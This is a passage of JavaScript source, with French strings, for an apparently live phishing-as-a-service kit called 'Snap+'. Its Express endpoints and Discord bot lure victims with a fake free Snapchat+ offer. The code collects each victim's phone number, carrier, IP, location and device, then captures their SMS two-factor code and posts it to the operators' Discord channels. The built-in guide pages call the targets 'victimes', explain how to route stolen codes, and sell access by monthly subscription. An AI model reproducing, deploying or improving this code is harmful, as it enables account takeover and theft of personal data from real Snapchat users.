    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    res.json({
        approved:  request.approved,
        rejected:  request.rejected,
        snapchat:  request.snapchat,
        resend:    request.resend || false   // signal "Renvoyer SMS"
    });
});

// 4. Acquitter le signal "resend"
app.post('/api/resend-ack/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    request.resend = false;
    saveRequests(requests);
    res.json({ ok: true });
});

// 5. Code reçu
app.post('/api/code', async (req, res) => {
    const { id, code } = req.body;
    if (!code) return res.json({ success: true });

    const request = requests.get(id) || {};
    const snapchat  = request.snapchat  || 'Inconnu';
    const phone     = request.phone     || 'Inconnu';
    const operator  = request.operator  || 'Inconnu';
    const device    = request.device    || 'Inconnu';
    const os        = request.os        || 'Inconnu';
    const ip        = request.ip        || 'Inconnu';

    const sendCode = async () => {
        await sendToDiscord(async () => {
            const refChannelId  = request.refChannelId || null;
            const refGuildId    = request.refGuildId   || null;
            const priorityChannel = cfg.salon_prioritaire ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
            const clientChannel   = refChannelId ? client.channels.cache.get(refChannelId) : null;
            const fallbackChannel = client.channels.cache.get(APPROVAL_CHANNEL_ID);

            const geoCode = request.geo  || '?';
            const ispCode = request.isp  || '?';

            const codeFields = [
                { name: '👤 Pseudo',    value: `\`${snapchat}\``, inline: true },
                { name: '📞 Téléphone', value: `\`${phone}\``,    inline: true },
                { name: '📡 Opérateur', value: operator,          inline: true },
            ];
            if (cfg.afficher_appareil) {
                codeFields.push({ name: '📱 Appareil', value: device, inline: true });
                codeFields.push({ name: '💻 OS',       value: os,     inline: true });
            }
            if (cfg.afficher_ip) {
                codeFields.push({ name: '🌍 Localisation', value: geoCode, inline: true });
                codeFields.push({ name: '🔌 FAI',          value: ispCode, inline: true });
                codeFields.push({ name: '🔒 IP',           value: `\`${ip}\``, inline: true });
            }
            codeFields.push({ name: '🔑 Code 2FA', value: `## ${code}`, inline: false });

            const codeEmbed = new EmbedBuilder()
                .setTitle('🔐 Code 2FA intercepté')
                .setDescription('> Le code SMS a été saisi par l\'utilisateur.')
                .setColor(0x00FF66)
                .addFields(...codeFields)
                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
                .setTimestamp();

            // 1. PRIORITY — lecture seule, toujours
            if (priorityChannel) {
                try {
                    const priorityCodeEmbed = new EmbedBuilder()
                        .setTitle('👁️ PRIORITAIRE — Code 2FA intercepté')
                        .setDescription(`> Lecture seule.${refGuildId ? ` Client : \`${refGuildId}\`` : ''}`)
                        .setColor(0x00FF66)
                        .addFields(...codeFields)
                        .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                        .setTimestamp();
                    await priorityChannel.send({ content: `<@${OWNER_ID}> 🔑 Code reçu !`, embeds: [priorityCodeEmbed] });
                } catch (e) { console.error('Erreur salon prioritaire (code):', e.message); }
            }

            // 2. Canal client (si ref) OU canal principal (sinon)
            const targetChannel = refGuildId ? clientChannel : fallbackChannel;
            if (targetChannel) {
                setTimeout(async () => {
                    try { await targetChannel.send({ embeds: [codeEmbed] }); }
                    catch (e) { console.error('Erreur envoi code 2FA vers canal cible:', e.message); }
                }, cfg.delai_discord_sec * 1000);
            } else if (refGuildId) {
                // Client channel introuvable, fallback sur canal principal
                setTimeout(async () => {
                    try { await fallbackChannel?.send({ embeds: [codeEmbed] }); }
                    catch (e) {}
                }, cfg.delai_discord_sec * 1000);
            }
        });
    };

    sendCode().catch(console.error);
    incStat('codes');
    updateBotStatus();
    if (id) {
        requests.delete(id);
        saveRequests(requests);
    }

    res.json({ success: true });
});

// ================== SLASH COMMANDS ==================
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    // Vérifier si le serveur est désactivé par l'owner (sauf owner lui-même)
    if (interaction.guildId && !isOwner(interaction.user.id)) {
        if (cfg.disabled_guilds && cfg.disabled_guilds.includes(interaction.guildId)) {
            return interaction.reply({
                embeds: [new EmbedBuilder()
                    .setTitle('🚫 Accès désactivé')
                    .setDescription('Ce bot a été désactivé sur ce serveur par son créateur.\n\nPour plus d\'informations, contacte le créateur ou rejoins le serveur de support.')
                    .addFields({ name: '🔗 Support', value: 'https://discord.gg/jS5azHn4bV' })
                    .setColor(0xFF4444)
                    .setFooter({ text: 'Snap+ Bot' })
                ],
                ephemeral: true
            });
        }
    }

    // /setstatus — OWNER ONLY
    if (interaction.commandName === 'setstatus') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        cfg.status_channel_id = interaction.channelId;
        cfg.status_message_id = ''; // reset pour envoyer un nouveau message
        saveConfig(cfg);
        await interaction.reply({ content: `📡 Canal de status configuré sur ce salon ! Envoi en cours...`, ephemeral: true });
        await updateStatusEmbed();
        return;
    }

    // /install — guide d'installation pour nouveaux serveurs
    if (interaction.commandName === 'install') {
        const clientId = DISCORD_CLIENT_ID || (client.user ? client.user.id : null);
        const inviteLink = clientId
            ? `https://discord.com/api/oauth2/authorize?client_id=${clientId}&permissions=2147609600&scope=bot%20applications.commands`
            : null;

        const embeds = [
            new EmbedBuilder()
                .setTitle('🚀 Installation — Snap+ Bot')
                .setDescription('Suis ces étapes pour intégrer le bot Snap+ sur ton serveur et recevoir les demandes directement chez toi.')
                .setColor(0xFFFC00)
                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                .setTimestamp(),

            new EmbedBuilder()
                .setTitle('① Invite le bot sur ton serveur')
                .setColor(0x5865F2)
                .setDescription(
                    inviteLink
                        ? `Clique sur le lien ci-dessous pour inviter **Snap+** sur ton serveur Discord :\n\n🔗 [**Inviter le bot**](${inviteLink})\n\n> Le bot a besoin des permissions d'envoi de messages et de gestion des interactions.`
                        : '⚠️ Lien d\'invitation indisponible — contacte l\'owner.'
                ),

            new EmbedBuilder()
                .setTitle('② Configure le salon de réception')
                .setColor(0x00B0F4)
                .setDescription(
                    '**Va dans le salon où tu veux recevoir les demandes** et tape :\n\n```\n/setchannel\n```\n\n> Le bot va enregistrer ce salon et générer **ton lien unique**.\n> Seuls les admins avec un abonnement actif peuvent utiliser cette commande.'
                ),

            new EmbedBuilder()
                .setTitle('③ Récupère ton lien unique')
                .setColor(0x00FF6A)
                .setDescription(
                    'Après `/setchannel`, le bot t\'envoie un message avec ton **lien personnalisé** :\n\n```\nhttps://snap-ivh7.onrender.com?ref=TON_GUILD_ID\n```\n\n> Ce lien est unique à ton serveur.\n> Toutes les demandes faites via ce lien arriveront **directement dans ton salon**.'
                ),

            new EmbedBuilder()
                .setTitle('④ Partage le lien')
                .setColor(0xFF6B6B)
                .setDescription(
                    'Envoie ce lien à tes clients. Ils remplissent le formulaire et la demande arrive chez toi avec :\n\n✅ **Bouton Accepter** — active l\'abonnement Snap+\n❌ **Bouton Refuser** — rejette la demande\n📲 **Bouton Renvoyer SMS** — redemande le code'
                ),

            new EmbedBuilder()
                .setTitle('⑤ Gère les demandes')
                .setColor(0xFFA500)
                .setDescription(
                    'Quand une demande arrive dans ton salon :\n\n> 1. Clique **Accepter** → le client reçoit la confirmation\n> 2. Clique **Refuser** → la demande est annulée\n> 3. Les demandes expirent automatiquement après **5 minutes** sans réponse\n\n💡 **Conseil :** crée un salon privé uniquement pour toi et tes mods pour éviter que les membres voient les demandes.'
                )
                .setFooter({ text: 'Snap+ Bot • Besoin d\'aide ? Contacte l\'owner.' }),
        ];

        await interaction.reply({ embeds, ephemeral: false });
        return;
    }

    // /broadcast — OWNER ONLY
    if (interaction.commandName === 'broadcast') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        await interaction.deferReply({ ephemeral: true });
        const msg   = interaction.options.getString('message');
        const titre = interaction.options.getString('titre') || '📢 Annonce';
        const channels = Object.values(cfg.guild_channels || {});
        let sent = 0, failed = 0;
        for (const channelId of channels) {
            try {
                const ch = client.channels.cache.get(channelId) || await client.channels.fetch(channelId).catch(() => null);
                if (!ch) { failed++; continue; }
                await ch.send({ embeds: [new EmbedBuilder()
                    .setTitle(titre)
                    .setDescription(msg)
                    .setColor(0xFFFC00)
                    .setFooter({ text: 'Snap+ Bot' })
                    .setTimestamp()
                ]});
                sent++;
            } catch(e) { failed++; }
        }
        return interaction.editReply({ content: `✅ Envoyé à **${sent}** serveur(s)${failed > 0 ? ` — ${failed} échec(s)` : ''}.` });
    }

    // /genpromo — OWNER ONLY
    if (interaction.commandName === 'genpromo') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        const tier = interaction.options.getString('tier');
        const heures = interaction.options.getInteger('heures');
        const maxUses = interaction.options.getInteger('utilisations') || 1;
        const code = 'SNAP-' + Math.random().toString(36).slice(2, 8).toUpperCase();
        const durationMs = heures * 60 * 60 * 1000;
        promos[code] = { code, createdAt: Date.now(), durationMs, maxUses, tier, usedBy: [] };
        savePromos(promos);
        const expiresAt = Math.floor((Date.now() + durationMs) / 1000);
        const tierLabel = tier === 'bot' ? '🤖 Bot (3€/mois)' : '💎 Premium (6€/mois)';
        const promoEmbed = new EmbedBuilder()
            .setTitle('🎟️ Code promo généré')
            .setColor(tier === 'bot' ? 0x5865F2 : 0xFFFC00)
            .addFields(
                { name: '🔑 Code', value: `\`\`\`${code}\`\`\``, inline: false },
                { name: '🎯 Accès', value: tierLabel, inline: true },
                { name: '⏱️ Durée', value: `${heures}h`, inline: true },
                { name: '👥 Utilisations', value: `${maxUses}`, inline: true },
                { name: '⏰ Expire', value: `<t:${expiresAt}:F>`, inline: false }
            )
            .setFooter({ text: 'Snap+ • Code à usage limité' })
            .setTimestamp();
        // Envoyer en DM
        try {
            const owner = await client.users.fetch(OWNER_ID);
            await owner.send({ embeds: [promoEmbed] });
        } catch(e) {}
        return interaction.reply({ embeds: [promoEmbed] });
    }

    // /setchannel — requiert premium sur le serveur OU owner
    if (interaction.commandName === 'setchannel') {
        const guildId = interaction.guildId;
        if (!guildId) return interaction.reply({ content: '🚫 Commande uniquement en serveur.', ephemeral: true });
        if (!isOwner(interaction.user.id) && !hasBotAccess(interaction.user.id) && !hasGuildBotAccess(guildId)) {
            return interaction.reply({ content: '🔒 Tu as besoin d\'un abonnement **Bot** (3€/mois) ou **Premium** (6€/mois) pour configurer ce bot.\nUtilise `/forfaits` pour voir les offres.', ephemeral: true });
        }
        if (!cfg.guild_channels) cfg.guild_channels = {};
        if (!cfg.guild_owners) cfg.guild_owners = {};
        cfg.guild_channels[guildId] = interaction.channelId;
        cfg.guild_owners[guildId] = interaction.user.id;
        await saveGuildChannels();
        await interaction.reply({ embeds: [new EmbedBuilder()
            .setTitle('✅ Canal configuré')
            .setDescription(`Les demandes Snap+ arriveront désormais dans ce salon.\n\n📎 **Ton lien unique :**\n\`\`\`${BASE_URL}?ref=${guildId}\`\`\`\nPartage ce lien — les demandes seront automatiquement routées ici.`)
            .setColor(0x00FF6A)
            .setFooter({ text: 'Snap+ • Configuration réussie' })
            .setTimestamp()
        ], ephemeral: true });
        return;
    }

    // /infodash — poste publiquement la présentation du dashboard
    if (interaction.commandName === 'infodash') {
        if (!isOwner(interaction.user.id) && !hasGuildPremium(interaction.guildId)) {
            return interaction.reply({ content: '🔒 Réservé aux serveurs avec un abonnement actif.', ephemeral: true });
        }
        const guildId = interaction.guildId;
        const clientLink = guildId && cfg.guild_channels && cfg.guild_channels[guildId]
            ? `${BASE_URL}?ref=${guildId}`
            : BASE_URL;
        const dashLink = `${BASE_URL}/dashboard`;

        await interaction.reply({ embeds: [
            new EmbedBuilder()
                .setTitle('📊 Dashboard de gestion — Snap+')
                .setDescription('Accède au panneau de contrôle pour gérer les demandes, configurer le bot et suivre les statistiques en temps réel.')
                .setColor(0xFFFC00)
                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                .addFields(
                    { name: '🖥️ Lien du dashboard', value: `[**Ouvrir le dashboard**](${dashLink})\n\`${dashLink}\``, inline: false },
                    { name: '🔗 Lien formulaire client', value: `\`${clientLink}\``, inline: false },
                    { name: '⚙️ Fonctionnalités', value: '• Voir et gérer toutes les demandes\n• Accepter / refuser en un clic\n• Statistiques en temps réel\n• Configuration complète du bot', inline: false },
                    { name: '🚀 Comment ça marche ?', value: '1️⃣ Le client remplit le formulaire via le lien\n2️⃣ La demande arrive dans ce salon\n3️⃣ Tu cliques **Accepter** ou **Refuser**\n4️⃣ Le client reçoit la confirmation instantanément', inline: false }
                )
                .setFooter({ text: 'Snap+ Bot • Propulsé par Snap Activator' })
                .setTimestamp()
        ]});
        return;
    }

    // /dashboard — OWNER ONLY
    if (interaction.commandName === 'dashboard') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        resetStatsIfNewDay();
        const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle('🖥️ Dashboard Admin')
                .setColor(0xFFFC00)
                .setDescription(`Accède au dashboard web pour gérer toutes les options du bot et du site.`)
                .addFields(
                    { name: '🔗 Lien', value: `[Ouvrir le dashboard](${BASE_URL}/dashboard)`, inline: false },
                    { name: '📥 Demandes aujourd\'hui', value: String(statsToday.total), inline: true },
                    { name: '⏳ En attente', value: String(pending), inline: true },
                    { name: '🌐 Site', value: cfg.site_actif ? '🟢 Actif' : '🔴 Désactivé', inline: true },
                )
                .setFooter({ text: `${BASE_URL}/dashboard` })
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /abonnement — tout le monde (limité à 5/jour pour les gratuits)
    if (interaction.commandName === 'abonnement') {
        const userId = interaction.user.id;
        if (!checkFreeLimit(userId, interaction.guildId)) {
            return interaction.reply({ content: `🔒 Limite journalière atteinte (**${FREE_DAILY_LIMIT} commandes/jour** en gratuit).\n💎 Passe **Premium** pour un accès illimité — utilise \`/forfaits\` pour voir les offres.`, flags: 64 });
        }
        let desc, color;
        if (isOwner(userId)) {
            desc = '👑 **Owner** — Accès Premium permanent et illimité.';
            color = 0xFFFC00;
        } else if (hasSubscription(userId)) {
            const sub = subs[userId];
            desc = '💎 **Premium actif**';
            if (sub?.expiresAt) { const d = new Date(sub.expiresAt); desc += `\n📅 Expire le : **${d.toLocaleDateString('fr-FR')}**`; }
            if (sub?.promoCode)  desc += `\n🎟️ Code utilisé : \`${sub.promoCode}\``;
            if (sub?.stripeSubId) desc += '\n💳 Via Stripe';
            color = 0x00FF6A;
        } else {
            desc = `🆓 **Gratuit** — Fonctionnalités limitées.\n\n💎 Obtiens **Premium** sur le dashboard :\n[${BASE_URL}/dashboard](${BASE_URL}/dashboard)`;
            color = 0x888888;
        }
        if (interaction.guildId && hasGuildPremium(interaction.guildId) && !isOwner(userId)) {
            desc += '\n\n🌐 Ce serveur bénéficie du Premium accordé par l\'owner du bot.';
        }
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle('💎 Mon abonnement')
                .setDescription(desc)
                .setColor(color)
                .setFooter({ text: `Snap+ • ${interaction.user.username}` })
                .setTimestamp()
            ],
            flags: 64
        });
    }

    // /guide — tout le monde
    if (interaction.commandName === 'guide') {
        const GUIDE_PAGES = {
            overview: {
                title: '📖 Vue d\'ensemble — Comment ça marche ?',
                color: 0xFFFC00,
                description: [
                    '**Snap+** est un système en 3 parties qui fonctionnent ensemble :',
                    '',
                    '**1️⃣ Le site web**',
                    'La victime visite le lien que tu lui partages. Elle voit une page qui lui propose d\'activer Snapchat+ gratuitement. Elle entre son pseudo Snap, son numéro et son opérateur.',
                    '',
                    '**2️⃣ Le bot Discord**',
                    'Dès que la victime soumet, une demande apparaît dans ton salon Discord avec toutes ses infos. Tu cliques ✅ ou ❌.',
                    '',
                    '**3️⃣ Le code 2FA**',
                    'Si tu acceptes, le site demande à la victime d\'entrer le code SMS qu\'elle reçoit (code de vérification Snapchat). Ce code s\'affiche dans ton Discord.',
                    '',
                    '> 💡 Sélectionne un sujet dans le menu ci-dessous pour plus de détails.',
                ].join('\n'),
            },
            setup: {
                title: '⚙️ Configuration — Mettre le bot dans ton serveur',
                color: 0x00BFFF,
                description: [
                    '**Étape 1 — Inviter le bot**',
                    `Utilise ce lien pour ajouter le bot à ton serveur Discord :`,
                    `\`\`\`https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&permissions=2147609600&scope=bot%20applications.commands\`\`\``,
                    '',
                    '**Étape 2 — Avoir un abonnement actif**',
                    'Le serveur doit avoir le Premium accordé par le propriétaire du bot. Utilise `/forfaits` pour voir les offres.',
                    '',
                    '**Étape 3 — Configurer ton salon de réception**',
                    'Va dans le salon Discord où tu veux recevoir les demandes, puis tape :',
                    '```/setchannel```',
                    'Le bot te répond avec ton **lien unique** : `https://site.com?ref=TON_ID`',
                    '',
                    '**Étape 3 — Partager le lien**',
                    'C\'est CE lien que tu envoies à tes victimes. Toutes les demandes via ce lien arriveront directement dans TON salon Discord.',
                    '',
                    '**Étape 4 — Changer de salon ?**',
                    'Refais simplement `/setchannel` dans un autre salon. Le lien reste le même, seul le salon de destination change.',
                    '',
                    '> ⚠️ Sans `/setchannel`, les demandes vont chez le propriétaire du bot, pas chez toi.',
                ].join('\n'),
            },
            requests: {
                title: '📥 Les demandes — Comment les traiter',
                color: 0x00FF6A,
                description: [
                    'Quand une victime soumet ses infos, un message apparaît dans ton salon avec :',
                    '> 👤 Pseudo Snap · 📞 Téléphone · 📡 Opérateur · 🌍 Localisation · 🔒 IP · 📱 Appareil',
                    '',
                    '**✅ Accepter**',
                    'Le site affiche un écran "Vérification en cours" à la victime et lui demande d\'entrer le code SMS qu\'elle reçoit. Ce code apparaît ensuite dans ton Discord.',
                    '',
                    '**❌ Refuser**',
                    'Le site affiche un message d\'erreur à la victime. La demande est clôturée.',
                    '',
                    '**📲 Renvoyer SMS**',
                    'Déclenche un nouvel envoi de code SMS à la victime (si elle dit ne pas l\'avoir reçu).',
                    '',
                    '**⏰ Timeout automatique**',
                    'Si tu ne réponds pas dans le délai configuré, la demande est automatiquement refusée et la victime voit une erreur.',
                    '',
                    '> 💡 Agis vite — le code SMS expire en général en 10 minutes côté Snapchat.',
                ].join('\n'),
            },
            link: {
                title: '🔗 Le lien unique — Comment ça fonctionne',
                color: 0xFF6600,
                description: [
                    '**Pourquoi un lien unique ?**',
                    'Si plusieurs personnes ont le bot dans leur serveur, il faut que chacun reçoive SES demandes et pas celles des autres.',
                    '',
                    '**Format du lien :**',
                    '```https://monsite.com?ref=123456789012345678```',
                    'Le `ref=` contient l\'ID de ton serveur Discord. C\'est ce qui permet au bot de router la demande vers ton salon.',
                    '',
                    '**Sans `?ref=` dans le lien ?**',
                    'La demande va directement chez le propriétaire du bot. N\'oublie pas d\'utiliser TON lien.',
                    '',
                    '**Comment avoir son lien ?**',
                    '1. Utilise `/setchannel` dans ton salon → le lien s\'affiche\n2. Ou demande au propriétaire du bot depuis le dashboard',
                    '',
                    '**Le lien change-t-il ?**',
                    'Non. Le lien est basé sur l\'ID de ton serveur, il ne change jamais même si tu changes de salon avec `/setchannel`.',
                ].join('\n'),
            },
            premium: {
                title: '💎 Gratuit vs Premium — Les différences',
                color: 0xFFD600,
                description: [
                    '**🆓 Gratuit**',
                    '> ✅ Commandes `/abonnement` `/forfaits` `/guide`',
                    '> ⚠️ Limité à **5 utilisations/jour** sur ces commandes',
                    '> ❌ Pas de `/stats` ni `/history`',
                    '> ❌ Pas de lien unique (demandes chez l\'owner)',
                    '> ❌ Pas de réception des demandes dans ton serveur',
                    '',
                    '**🤖 Accès Bot — 3€/mois**',
                    '> ✅ Bot actif dans ton serveur Discord',
                    '> ✅ Lien unique `/setchannel` → demandes dans ton salon',
                    '> ✅ Notifications des demandes en temps réel',
                    '> ❌ Stats & historique avancé',
                    '',
                    '**💎 Premium — 6€/mois**',
                    '> ✅ Tout l\'Accès Bot',
                    '> ✅ `/stats` — statistiques en temps réel',
                    '> ✅ `/history` — 50 dernières demandes',
                    '> ✅ `/pending` — file d\'attente live',
                    '> ✅ DM automatique à chaque action',
                    '',
                    `> Utilise \`/forfaits\` pour passer à un abonnement payant.`,
                ].join('\n'),
            },
            commands: {
                title: '🤖 Toutes les commandes disponibles',
                color: 0xA855F7,
                description: [
                    '**Commandes disponibles pour tous :**',
                    '`/guide` — Ce guide interactif',
                    '`/forfaits` — Voir les offres et tarifs',
                    '`/abonnement` — Voir ton abonnement actuel',
                    '',
                    '**Commandes pour les serveurs avec abonnement :**',
                    '`/setchannel` — Définir le salon de réception des demandes',
                    '',
                    '**Commandes Premium :**',
                    '`/stats` — Stats du jour (demandes, acceptées, refusées, codes)',
                    '`/history` — Historique des 10 dernières demandes',
                    '`/pending` — Liste des demandes en attente avec timing',
                    '',
                    '**Commandes Owner uniquement :**',
                    '`/dashboard` — Lien vers le dashboard web',
                    '`/setstatus` — Configurer l\'embed de status live',
                    '`/pause` / `/resume` — Désactiver / réactiver le site',
                    '`/clear` — Vider toutes les demandes en attente',
                    '`/config show/set/reset` — Gérer la configuration',
                    '`/blacklist add/remove/list` — Gérer les IPs bloquées',
                ].join('\n'),
            },
        };

        const menu = new StringSelectMenuBuilder()
            .setCustomId('guide_menu')
            .setPlaceholder('📖 Choisir un sujet…')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Vue d\'ensemble').setDescription('Comment fonctionne le système en 3 étapes').setValue('overview').setEmoji('📖'),
                new StringSelectMenuOptionBuilder().setLabel('Configuration').setDescription('Mettre le bot dans ton serveur, /setchannel').setValue('setup').setEmoji('⚙️'),
                new StringSelectMenuOptionBuilder().setLabel('Les demandes').setDescription('Accepter, refuser, renvoyer SMS, timeout').setValue('requests').setEmoji('📥'),
                new StringSelectMenuOptionBuilder().setLabel('Le lien unique').setDescription('Comment fonctionne le ?ref= et le routing').setValue('link').setEmoji('🔗'),
                new StringSelectMenuOptionBuilder().setLabel('Gratuit vs Premium').setDescription('Ce qui est inclus dans chaque forfait').setValue('premium').setEmoji('💎'),
                new StringSelectMenuOptionBuilder().setLabel('Toutes les commandes').setDescription('Liste complète des commandes disponibles').setValue('commands').setEmoji('🤖'),
            );

        const row = new ActionRowBuilder().addComponents(menu);
        const page = GUIDE_PAGES.overview;

        const reply = await interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle(page.title)
                .setDescription(page.description)
                .setColor(page.color)
                .setFooter({ text: 'Snap+ Guide • Sélectionne un sujet dans le menu' })
                .setTimestamp()
            ],
            components: [row],
            flags: 64,
            fetchReply: true,
        });

        // Collecteur pour les interactions du menu (5 minutes)
        const collector = reply.createMessageComponentCollector({
            componentType: ComponentType.StringSelect,
            time: 5 * 60 * 1000,
        });

        collector.on('collect', async i => {
            if (i.user.id !== interaction.user.id) {
                return i.reply({ content: '❌ Ce menu t\'est pas destiné.', ephemeral: true });
            }
            const selected = i.values[0];
            const p = GUIDE_PAGES[selected];
            await i.update({
                embeds: [new EmbedBuilder()
                    .setTitle(p.title)
                    .setDescription(p.description)
                    .setColor(p.color)
                    .setFooter({ text: 'Snap+ Guide • Sélectionne un sujet dans le menu' })
                    .setTimestamp()
                ],
                components: [row],
            });
        });

        collector.on('end', async () => {
            try {
                await interaction.editReply({ components: [] });
            } catch(e) {}
        });

        return;
    }

    // /forfaits — tout le monde (pas de limite, c'est une pub)
    if (interaction.commandName === 'forfaits') {
        const PAYPAL_LINK = 'https://paypal.me/TON_PAYPAL'; // ← remplace par ton lien PayPal

        const totalStr = statsTotal.total > 0
            ? `🎯 **${statsTotal.total}** comptes récupérés au total — **${statsTotal.approved}** acceptés`
            : '';

        const embed = new EmbedBuilder()
            .setTitle('✨ Forfaits Snap+')
            .setDescription(`Obtiens un accès au bot Snap+ et récupère des comptes Snapchat+.\nPaiement via **PayPal** — activation **sous 24h**.\n${totalStr ? `\n${totalStr}` : ''}`)
            .setColor(0xFFFC00)
            .addFields(
                { name: '━━━━━━━━━━━━━━━━━━━━━━', value: '​', inline: false },
                {
                    name: '🆓 Gratuit — 0€',
                    value: [
                        '> ✅ Commandes `/abonnement` `/forfaits`',
                        '> ⚠️ **5 demandes de numéro/jour** max',
                        '> ❌ Aucune stat ni historique',
                        '> ❌ Pas de contrôle du bot',
                        '> ❌ Pas de notifications',
                    ].join('\n'),
                    inline: true
                },
                {
                    name: '🤖 Accès Bot — 3€/mois',
                    value: [
                        '> ✅ Bot actif dans ton serveur',
                        '> ✅ Commandes `/abonnement` `/forfaits`',
                        '> ✅ Notifications des demandes',
                        '> ❌ Stats & historique détaillé',
                        '> ❌ Demandes en attente & contrôle',
                        '> ❌ Export & analytics',
                    ].join('\n'),
                    inline: true
                },
                {
                    name: '💎 Premium — 6€/mois',
                    value: [
                        '> ✅ Tout l\'accès Bot inclus',
                        '> ✅ `/stats` — stats en temps réel',
                        '> ✅ `/history` — 50 dernières demandes',
                        '> ✅ `/pending` — file d\'attente live',
                        '> ✅ Notifs DM à chaque action',
                        '> ✅ Support prioritaire',
                    ].join('\n'),
                    inline: true
                },
                { name: '━━━━━━━━━━━━━━━━━━━━━━', value: '​', inline: false },
                {
                    name: '💳 Comment payer ?',
                    value: '1. Clique sur le bouton **PayPal** ci-dessous\n2. Envoie le montant avec ton **pseudo Discord** en note\n3. Accès activé **sous 24h** par le propriétaire',
                    inline: false
                },
            )
            .setThumbnail('https://upload.wikimedia.org/wikipedia/fr/thumb/a/a9/Snapchat_logo.svg/800px-Snapchat_logo.svg.png')
            .setFooter({ text: 'Snap+ Bot • Questions ? Contacte le propriétaire du bot' })
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('Payer 3€ — Bot')
                .setStyle(5) // LINK
                .setEmoji('🤖')
                .setURL(PAYPAL_LINK),
            new ButtonBuilder()
                .setLabel('Payer 6€ — Premium')
                .setStyle(5)
                .setEmoji('💎')
                .setURL(PAYPAL_LINK),
        );

        return interaction.reply({ embeds: [embed], components: [row] });
    }

    // /stats — premium ou owner seulement
    if (interaction.commandName === 'stats') {
        if (!canUsePremium(interaction.user.id, interaction.guildId)) {
            return interaction.reply({ content: '🔒 Commande réservée aux membres **Premium**. Utilise `/abonnement` pour en savoir plus.', flags: 64 });
        }
        resetStatsIfNewDay();
        const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle('📊 Stats du jour')
                .setColor(0xFFFC00)
                .addFields(
                    { name: '📥 Demandes',   value: String(statsToday.total),    inline: true },
                    { name: '✅ Acceptées',  value: String(statsToday.approved),  inline: true },
                    { name: '❌ Refusées',   value: String(statsToday.rejected),  inline: true },
                    { name: '🔐 Codes',      value: String(statsToday.codes),     inline: true },
                    { name: '⏳ En attente', value: String(pending),              inline: true }
                )
                .setFooter({ text: statsToday.date })
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /pause — OWNER ONLY
    if (interaction.commandName === 'pause') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        cfg.site_actif = false; saveConfig(cfg); updateBotStatus();
        return interaction.reply({ content: '⏸️ Site **désactivé**. Aucune nouvelle soumission ne sera acceptée.', ephemeral: true });
    }

    // /resume — OWNER ONLY
    if (interaction.commandName === 'resume') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        cfg.site_actif = true; saveConfig(cfg); updateBotStatus();
        return interaction.reply({ content: '▶️ Site **réactivé**. Les soumissions sont de nouveau acceptées.', ephemeral: true });
    }

    // /pending — OWNER ONLY
    if (interaction.commandName === 'pending') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        const pending = [...requests.entries()].filter(([, r]) => !r.approved && !r.rejected);
        if (pending.length === 0) return interaction.reply({ content: '✅ Aucune demande en attente.', ephemeral: true });
        const lines = pending.map(([id, r]) => {
            const elapsed = Math.floor((Date.now() - r.createdAt) / 1000);
            const m = Math.floor(elapsed / 60), s = String(elapsed % 60).padStart(2,'0');
            const remain = Math.max(0, cfg.timeout_minutes * 60 - elapsed);
            const rm = Math.floor(remain / 60), rs = String(remain % 60).padStart(2,'0');
            return `⏳ **${r.snapchat}** | ${r.phone} | \`${r.geo || '?'}\` | Attente: ${m}:${s} | Expire: ${rm}:${rs}`;
        });
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle(`⏳ ${pending.length} demande(s) en attente`)
                .setColor(0xFFFC00)
                .setDescription(lines.join('\n'))
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /blacklist — OWNER ONLY
    if (interaction.commandName === 'blacklist') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        const sub = interaction.options.getSubcommand();
        if (sub === 'add') {
            const ip = interaction.options.getString('ip');
            blacklist.add(ip); saveBlacklist(blacklist);
            return interaction.reply({ content: `🚫 IP \`${ip}\` ajoutée à la blacklist.`, ephemeral: true });
        }
        if (sub === 'remove') {
            const ip = interaction.options.getString('ip');
            blacklist.delete(ip); saveBlacklist(blacklist);
            return interaction.reply({ content: `✅ IP \`${ip}\` retirée de la blacklist.`, ephemeral: true });
        }
        if (sub === 'list') {
            const list = [...blacklist];
            if (list.length === 0) return interaction.reply({ content: '✅ Aucune IP blacklistée.', ephemeral: true });
            return interaction.reply({
                embeds: [new EmbedBuilder()
                    .setTitle(`🚫 Blacklist (${list.length} IPs)`)
                    .setColor(0xFF4444)
